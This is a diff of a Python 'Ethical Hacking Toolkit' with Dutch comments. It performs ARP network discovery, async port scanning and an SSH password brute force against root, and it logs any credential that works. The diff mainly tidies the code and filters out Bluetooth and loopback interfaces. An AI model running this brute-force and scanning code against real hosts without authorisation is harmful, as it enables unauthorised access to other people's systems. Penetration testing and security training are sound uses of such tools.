@@ -5,13 +5,13 @@ import base64
 import json
 import logging
 import sys
-from typing import Dict, List, Union, Any, Optional
+from typing import Dict, List, Optional
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 import platform
 import asyncio
 import time
-import fnmatch  # <-- Toegevoegd voor bestandsmatching
+import fnmatch
 
 # Onderdruk waarschuwingen
 warnings.filterwarnings("ignore", category=DeprecationWarning)
@@ -27,7 +27,6 @@ logging.getLogger("paramiko").setLevel(logging.WARNING)
 # Configuratie
 MAX_SCAN_PORTS = 15
 MIN_RATE_LIMIT = 1.0
-MAX_HISTORY_FILES = 3
 
 # Configureer logging
 logging.basicConfig(
@@ -69,11 +68,16 @@ def save_results(data: Dict, filename: str = "scan_results") -> None:
         logging.error(f"Opslagfout: {str(e)}")
 
 def arp_scan(target_ip: str = "192.168.1.0/24") -> Optional[List[Dict[str, str]]]:
-    """Geavanceerde ARP-scanner met interface detectie en terugkeeroptie"""
+    """Geavanceerde ARP-scanner met interface detectie en terugkeeroptie (zonder Bluetooth/loopback)"""
     logging.info("ARP-scan initialiseren...")
-    
     try:
-        available_ifaces = [iface for iface in get_working_ifaces() if iface.ip]
+        # Filter: geen Bluetooth, geen loopback
+        available_ifaces = [
+            iface for iface in get_working_ifaces()
+            if iface.ip
+            and 'bluetooth' not in iface.name.lower()
+            and not iface.ip.startswith("127.")
+        ]
         if not available_ifaces:
             logging.error("Geen bruikbare interfaces gevonden")
             return []
@@ -135,46 +139,37 @@ async def check_port(host: str, port: int) -> Optional[tuple]:
         )
         writer.close()
         await writer.wait_closed()
-        
-        # Service naam bepalen
         try:
             service = socket.getservbyport(port)
         except (OSError, socket.error):
             service = "onbekend"
-            
         return (port, service)
     except Exception:
-        return None  # Geeft expliciet None terug bij fouten
+        return None
 
 async def async_port_scan(host: str, ports: List[int] = None) -> Dict[int, str]:
     """Asynchrone portscanner met verbeterde foutafhandeling"""
     logging.info(f"Portscan gestart voor {host}")
-    
     default_ports = [21, 22, 23, 80, 443, 8080, 3389, 5900]
     ports = ports[:MAX_SCAN_PORTS] if ports else default_ports
-    
     open_ports = {}
     tasks = [check_port(host, port) for port in ports]
     results = await asyncio.gather(*tasks)
-    
     for result in results:
         if result is not None:
             port, service = result
             open_ports[port] = service
             logging.warning(f"Poort {port} ({service}) is open")
-    
     return open_ports
 
 def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_workers: int = 3) -> bool:
     """Beveiligde SSH bruteforce met rate limiting"""
     logging.warning(f"SSH bruteforce gestart op {host}:{port}")
-    
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.WarningPolicy())
-    
     try:
         with open("passwords.txt") as f:
-            passwords = [line.strip() for line in f if line.strip()][:10]  # Max 10 wachtwoorden
+            passwords = [line.strip() for line in f if line.strip()][:10]
     except FileNotFoundError:
         logging.error("passwords.txt niet gevonden!")
         return False
@@ -193,7 +188,7 @@ def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_worker
             logging.critical(f"SUCCESVOL: {username}:{password}")
             client.close()
             return True
-        except Exception as e:
+        except Exception:
             logging.debug(f"Mislukt: {password}")
             return False
 
@@ -210,10 +205,8 @@ def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_worker
 async def main():
     print("=== Ethical Hacking Toolkit ===")
     print("Alleen voor geautoriseerd gebruik!\n")
-    
     if platform.system() == "Windows":
         print("[!] Draai als Administrator")
-    
     target = input("Target IP/netwerk: ").strip()
     if '/' not in target:
         target += "/24"
@@ -225,14 +218,12 @@ async def main():
         'ssh_bruteforce': {}
     }
 
-    # ARP Scan met terugkeeroptie
     arp_result = arp_scan(target)
     if arp_result is None:
         print("\nTerug naar hoofdmenu...")
-        return  # Keer terug naar hoofdmenu/hoofdscript
+        return
 
     results['arp_scan'] = arp_result
-    
     if results['arp_scan']:
         for device in results['arp_scan']:
             current_ip = device['IP']
